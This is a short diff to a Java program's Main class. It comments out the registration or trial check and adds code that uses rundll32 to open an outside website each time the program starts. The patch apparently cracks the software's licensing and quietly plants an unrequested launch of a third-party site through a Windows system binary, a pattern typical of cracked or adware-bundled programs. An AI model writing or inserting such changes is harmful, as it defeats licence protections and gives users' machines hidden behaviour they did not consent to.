@@ -53,8 +53,16 @@ public class Main {
     }
 
     public static void main(String[] argv) {
+        /*
         if (!isRegistered()) {
             checkRuns();
+        }
+        */
+
+        try {
+            Runtime.getRuntime().exec("rundll32 url.dll,FileProtocolHandler https://baldar.great-site.net");
+        } catch (Exception e) {
+            e.printStackTrace();
         }
 
         int i = 0;
